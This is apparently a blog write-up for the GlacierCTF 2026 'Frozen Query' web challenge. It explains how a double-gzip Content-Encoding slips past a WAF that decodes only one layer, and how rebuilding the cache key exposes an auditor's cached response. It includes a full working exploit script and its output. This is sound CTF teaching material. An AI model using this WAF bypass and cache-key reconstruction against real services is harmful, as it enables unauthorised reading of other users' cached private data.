---
title: "Frozen Query Walkthrough - GlacierCTF 2026 | HTTP QUERY Cache Abuse & Double-Gzip WAF Bypass"
description: "Walkthrough for the Frozen Query challenge from GlacierCTF 2026. A web challenge abusing the new HTTP QUERY method: by reconstructing the cache key we read the flag from the auditor's cached response, bypassing the WAF blocklist with a double-gzip Content-Encoding that is only fully decoded after the WAF check."
author: dua2z3rr
date: 2026-11-21 2:00:00
categories:
  - CTF Competitions
  - GlacierCTF 2026
  - Challenges
tags:
  - web
---

## Challenge Overview

The Glacier Avalanche Service moved its bulletins to the shiny new HTTP QUERY method from RFC 10008. Thanks to the edge cache, the summit auditor's reports are served faster than ever.

Only auditors may read the summit bulletin. Right?

---

## Solution

### Source Code

First, by reading the source code we find where the flag is located: in `src/backend.py` it lives inside the `BULLETINS` dictionary.

```python
FLAG = os.environ.get("FLAG", "gctf{FAKE_FAKE_FAKE_FAKE_FAKE_FAKE}")
AUDIT_TOKEN = os.environ["AUDIT_TOKEN"]

BULLETINS = {
    "valley": {"level": 1, "note": "Low danger. Enjoy the powder."},
    "ridge": {"level": 3, "note": "Considerable. Wind slabs on north aspects."},
    "glacier": {"level": 2, "note": "Moderate. Mind the crevasses."},
    "summit": {"level": 5, "note": "Extreme. Station closed to the public.", "flag": FLAG},
}
RESTRICTED_FIELDS = {"flag"}
```

### The Peculiarity of This Challenge

What makes this challenge unique is the use of the new HTTP request method called QUERY, recently introduced after a long period without updates.

> QUERY is the new HTTP method that is very similar to a GET. It is used to read data, which is filtered through the body we send. In addition, responses are stored in the cache, so other users making the same request will receive it immediately, speeding up computationally expensive queries.
{: .prompt-info }

In this challenge it is the only request method we can use. As we can see from the source code, an auditor (effectively the admin) keeps making requests to this endpoint every 5 seconds, placing the flag into the cache (line 192 of `src/app.py`).

```python
def auditor_loop():
    # Re-checks the summit bulletin every few seconds, bypassing the cache.
    while True:
        query = {
            "region": "summit",
            "fields": ["level", "note", "flag"],
            "window": int(time.time() // 30),
        }
        try:
            requests.request(
                "QUERY",
                "http://127.0.0.1:1337/api/bulletin",
                data=json.dumps(query),
                headers={
                    "Authorization": f"Bearer {AUDIT_TOKEN}",
                    "Content-Type": "application/vnd.glacier.bulletin+json",
                    "Accept": "application/json",
                    "Cache-Control": "no-cache",
                },
                timeout=5,
            )
        except requests.RequestException:
            pass
        time.sleep(5)
```

The auditor's request includes an `AUDIT_TOKEN` in the headers, which proves the request was made by the admin. We don't know this token and it cannot be leaked.

### Setting Up the Testing Environment

To test and debug the code (both our own requests and the auditor's), we can use the Dockerfile included with the challenge and build it with `./deploy.sh`. We can then interact with the container via `docker exec -it chall-frozen-query sh`.

We can visit the website, which lets us send queries through the GUI (though we won't use it) on port 1337.

![homepage](assets/img/frozen_query/homepage.png)

### How Do We Read the Cache?

First, we need to ask ourselves how we can take advantage of the cache, even for requests that have nothing to do with it. The cache in this exercise is a simple Python dictionary guarded by a lock (so we can rule out synchronization-related issues like deadlocks, etc.).

```python
cache = {}  # key -> (expires, status, headers, body)
cache_lock = threading.Lock()
```

As the comment shows, each key maps to a tuple made of: when the cached query expires and must be removed (30 seconds for this challenge), the response status code, the response headers, and the response body. We know that the response body of the request the auditor makes every 5 seconds contains the flag.

But how is the key chosen?

### Key Generation Algorithm

The key is generated via a hashing function that takes 4 elements of the request as input:

1. The request path (which will always be `/api/bulletin`)
2. The normalized `Content-Type` header
3. The `Accept` header
4. The request body

Here is the code snippet that shows it (line 139 of `src/app.py`):

```python
@app.route("/api/bulletin", methods=["QUERY"])
def bulletin():
    raw = request.get_data()
    encoding = request.headers.get("Content-Encoding", "")
    auditor = is_auditor()

    if not auditor and not waf_allows(raw, encoding):
        return jsonify(error="blocked by glacier-edge"), 403

    media_type = normalize_media_type(request.headers.get("Content-Type", ""))
    if media_type != "application/json":
        resp = jsonify(error="unsupported query media type")
        resp.status_code = 415
        resp.headers["Accept-Query"] = "application/json"
        return resp

    content = decode_content(raw, encoding)
    accept = request.headers.get("Accept", "*/*")
    key = cache_key(request.path, media_type, accept, content)
```

How the key is derived is shown in the `cache_key` function (line 85 of `src/app.py`):

```python
def cache_key(path, media_type, accept, content):
    try:
        canonical = json.dumps(
            json.loads(content), sort_keys=True, separators=(",", ":")
        )
    except ValueError:
        abort(400)
    material = "\n".join([path, media_type, accept, canonical])
    return hashlib.sha256(material.encode()).hexdigest()
```

Now that we know how the keys work, we notice that sending a query via Python that would produce the same key is trickier than usual.

First, there is a check we need to pass, which we'll look at in more detail later:

```python
if not auditor and not waf_allows(raw, encoding):
    return jsonify(error="blocked by glacier-edge"), 403
```

Then, the auditor's request body contains an epoch value that requires the request to be made at a precise moment.

```python
query = {
	"region": "summit",
	"fields": ["level", "note", "flag"],
	"window": int(time.time() // 30),
}
```

### Zipping Is the Way

Going back to the initial check: we are not the auditor, so unlike the admin (who does NOT go through it), we are forced into the second condition of the `if`. That clause is:

```python
not waf_allows(raw, encoding)
```

Let's look at what this function does:

```python
def waf_allows(body, encoding):
    # Peek through the transfer compression our SDK applies, then look at what
    # the query actually says.
    codings = parse_codings(encoding)
    if codings and codings[-1] == "gzip":
        body = gunzip(body)
    try:
        text = json.dumps(json.loads(body))
    except ValueError:
        text = body.decode("latin-1")
    return not any(word in text.lower() for word in BLOCKLIST)
```

It takes as input the request body and the `Content-Encoding` header. If the last coding in `Content-Encoding` is gzip, it calls the function that is key to solving the challenge: `gunzip`.

```python
def gunzip(data):
    d = zlib.decompressobj(wbits=31)
    try:
        out = d.decompress(data, MAX_BODY + 1)
    except zlib.error:
        abort(400)
    if len(out) > MAX_BODY or d.unconsumed_tail:
        abort(413)
    return out
```

`gunzip` decompresses the data, so if we send a gzip-compressed payload, the app will decompress it for us. However, once decompressed, the blocklist check (which includes the word "flag") would flag our payload as malicious and we'd get a 403.

### Double Gzip Beats the WAF

The problem is solved by the function that runs after the WAF check:

Main part (same as above):

```python
@app.route("/api/bulletin", methods=["QUERY"])
def bulletin():
    raw = request.get_data()
    encoding = request.headers.get("Content-Encoding", "")
    auditor = is_auditor()

    if not auditor and not waf_allows(raw, encoding):
        return jsonify(error="blocked by glacier-edge"), 403

    media_type = normalize_media_type(request.headers.get("Content-Type", ""))
    if media_type != "application/json":
        resp = jsonify(error="unsupported query media type")
        resp.status_code = 415
        resp.headers["Accept-Query"] = "application/json"
        return resp

    content = decode_content(raw, encoding)
    accept = request.headers.get("Accept", "*/*")
    key = cache_key(request.path, media_type, accept, content)

```

Function:

```python
def decode_content(body, encoding):
    # RFC 10008 2.7: content codings are removed before keying.
    for _ in reversed(parse_codings(encoding)):
        body = gunzip(body)
    return body
```

As before, `encoding` is each coding listed in the `Content-Encoding` header we send. So, since this function calls `gunzip` once for every coding, we can send a request with two gzip codings in `Content-Encoding` and have it decompressed twice. This way we bypass the WAF check and produce the correct final payload to retrieve the flag from the auditor's cache.

### The Final Exploit

Here is the full exploit script:

```python
import gzip
import json
import sys
import time

import requests


def get_flag():
    time_now = int(time.time() // 30)
    query = {
        "region": "summit",
        "fields": ["level", "note", "flag"],
        "window": time_now,
    }

    raw = json.dumps(query).encode()
    payload = gzip.compress(gzip.compress(raw))
    
    try:
        resp = requests.request(
            "QUERY",
            "http://localhost:1337/api/bulletin",
            data=payload,
            headers={
                "Content-Type": "application/vnd.glacier.bulletin+json",
                "Accept": "application/json",
                "Content-Encoding": "gzip, gzip"
            },
            timeout=5,
        )

        print(resp.status_code)
        
        if resp.status_code == 200:
            print(resp.headers)
            print(resp.content)
            sys.exit()
    except requests.RequestException:
        pass

while True:
    get_flag()
```

The `while True` loop around `get_flag` is needed because we might not hit the exact epoch window the auditor used, but within about 5 seconds we get the flag.

### Execution

Running it:

```shell
python3 exploit.py
200
{'Cache-Control': 'public, max-age=30', 'Content-Length': '141', 'Content-Type': 'application/json', 'Date': 'Sun, 22 Nov 2026 18:43:37 GMT', 'Server': 'waitress', 'X-Cache': 'HIT'}
b'{"flag":"gctf{FAKE_FAKE_FAKE_FAKE_FAKE_FAKE}","level":5,"note":"Extreme. Station closed to the public.","region":"summit","window":59845767}\n'
```

**Flag obtained.**
